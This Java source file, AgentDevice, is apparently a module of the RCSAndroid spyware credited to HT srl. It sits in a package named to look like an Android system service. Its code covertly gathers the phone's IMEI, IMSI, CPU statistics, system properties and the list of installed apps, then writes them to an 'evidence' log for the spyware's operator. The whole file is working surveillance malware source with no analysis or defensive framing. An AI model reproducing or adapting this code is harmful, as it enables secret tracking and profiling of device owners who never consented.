/* **********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 30-mar-2011
 **********************************************/

package com.android.service.agent;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.ByteOrder;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Map.Entry;
import java.util.Properties;

import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.drawable.Drawable;
import android.util.Log;

import com.android.service.Device;
import com.android.service.LogR;
import com.android.service.Status;
import com.android.service.evidence.EvidenceType;
import com.android.service.util.Utils;
import com.android.service.util.WChar;

// TODO: Auto-generated Javadoc
/**
 * http://android.git.kernel.org/?p=platform/packages/apps/Settings.git;a=tree;f
 * =src/com/android/settings;h=1d1b538ef4728c9559da43828a7df9e9bb5c512f;hb=HEAD
 * 
 * @author zeno
 * 
 */
public class AgentDevice extends AgentBase {

	/** The Constant TAG. */
	public static final String TAG = "AgentDevice";

	/** The process list. */
	private int processList;

	/** The cpu usage. */
	private float cpuUsage;

	/** The cpu total. */
	private long cpuTotal;

	/** The cpu idle. */
	private long cpuIdle;

	/**
	 * Instantiates a new device agent.
	 */
	public AgentDevice() {
		Log.d("QZ", TAG + " DeviceAgent constructor");
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.agent.AgentBase#parse(byte[])
	 */
	@Override
	public boolean parse(AgentConf conf) {
		myConf = Utils.bufferToByteBuffer(conf.getParams(), ByteOrder.LITTLE_ENDIAN);

		this.processList = myConf.getInt();
		return true;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.agent.AgentBase#begin()
	 */
	@Override
	public void begin() {
		setPeriod(NEVER);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.ThreadBase#go()
	 */
	@Override
	public void go() {

		// OS Version etc...
		Log.d("QZ", TAG + " Android");

		final Runtime runtime = Runtime.getRuntime();
		final Properties properties = System.getProperties();
		readCpuUsage();

		final StringBuffer sb = new StringBuffer();
		sb.append("Debug\n");
		sb.append("-- SYSTEM --\r\n");
		sb.append("IMEI: " + Device.self().getImei() + "\n");
		
		if (Device.self().getImei().length() == 0)
			sb.append("IMSI: SIM not present\n");
		else
			sb.append("IMSI: " + Device.self().getImsi() + "\n");
		
		sb.append("cpuUsage: " + cpuUsage + "\n");
		sb.append("cpuTotal: " + cpuTotal + "\n");
		sb.append("cpuIdle: " + cpuIdle + "\n");

		sb.append("-- PROPERTIES --\r\n");
		final Iterator<Entry<Object, Object>> it = properties.entrySet().iterator();
		
		while (it.hasNext()) {
			final Entry<Object, Object> pairs = it.next();
			sb.append(pairs.getKey() + " : " + pairs.getValue() + "\n");
		}

		if (processList == 1) {
			final ArrayList<PInfo> apps = getInstalledApps(false); /*
																	 * false = no system packages
																	 */
			final int max = apps.size();
			
			for (int i = 0; i < max; i++) {
				sb.append(apps.get(i) + "\n");

			}
		}

		final String content = sb.toString();

		// final int ev = Evidence.convertTypeEvidence(AgentConf.AGENT_DEVICE);

		// atomic log
		// LogR log = new LogR(EvidenceType.DEVICE, LogR.LOG_PRI_STD, null,
		// WChar.getBytes(content, true));

		// log
		final LogR log = new LogR(EvidenceType.DEVICE, LogR.LOG_PRI_STD);
		log.write(WChar.getBytes(content, true));
		log.close();

		// Evidence
		// final Evidence evidence = new Evidence(Agent.AGENT_DEVICE);
		// evidence.atomicWriteOnce(null, EvidenceType.DEVICE,
		// WChar.getBytes(content, true));

	}

	/**
	 * Read cpu usage.
	 */
	private void readCpuUsage() {
		try {
			final BufferedReader reader = new BufferedReader(
					new InputStreamReader(new FileInputStream("/proc/stat")),
					1000);
			final String load = reader.readLine();
			reader.close();

			final String[] toks = load.split(" ");

			final long currTotal = Long.parseLong(toks[2])
					+ Long.parseLong(toks[3]) + Long.parseLong(toks[4]);
			final long currIdle = Long.parseLong(toks[5]);

			this.cpuUsage = ((currTotal - cpuTotal) * 100.0f / (currTotal
					- cpuTotal + currIdle - cpuIdle));
			this.cpuTotal = currTotal;
			this.cpuIdle = currIdle;
		} catch (final IOException ex) {
			ex.printStackTrace();
		}
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.agent.AgentBase#end()
	 */
	@Override
	public void end() {

	}

	/**
	 * The Class PInfo.
	 */
	class PInfo {
		
		/** The appname. */
		private String appname = "";
		
		/** The pname. */
		private String pname = "";
		
		/** The version name. */
		private String versionName = "";
		
		/** The version code. */
		private int versionCode = 0;
		
		/** The icon. */
		private Drawable icon;

		/* (non-Javadoc)
		 * @see java.lang.Object#toString()
		 */
		@Override
		public String toString() {
			return appname + "\t" + pname + "\t" + versionName + "\t"
					+ versionCode;
		}

	}

	/**
	 * Gets the packages.
	 *
	 * @return the packages
	 */
	private ArrayList<PInfo> getPackages() {
		final ArrayList<PInfo> apps = getInstalledApps(false); /*
																 * false = no
																 * system
																 * packages
																 */
		final int max = apps.size();
		for (int i = 0; i < max; i++) {
			Log.d("QZ", TAG + " Info: " + apps.get(i).toString());
		}
		return apps;
	}

	/**
	 * Gets the installed apps.
	 *
	 * @param getSysPackages the get sys packages
	 * @return the installed apps
	 */
	private ArrayList<PInfo> getInstalledApps(final boolean getSysPackages) {
		final ArrayList<PInfo> res = new ArrayList<PInfo>();
		final PackageManager packageManager = Status.getAppContext()
				.getPackageManager();

		final List<PackageInfo> packs = packageManager.getInstalledPackages(0);
		for (int i = 0; i < packs.size(); i++) {
			final PackageInfo p = packs.get(i);
			if ((!getSysPackages) && (p.versionName == null)) {
				continue;
			}
			final PInfo newInfo = new PInfo();
			newInfo.appname = p.applicationInfo.loadLabel(packageManager)
					.toString();
			newInfo.pname = p.packageName;
			newInfo.versionName = p.versionName;
			newInfo.versionCode = p.versionCode;
			newInfo.icon = p.applicationInfo.loadIcon(packageManager);
			res.add(newInfo);
		}
		return res;
	}
}
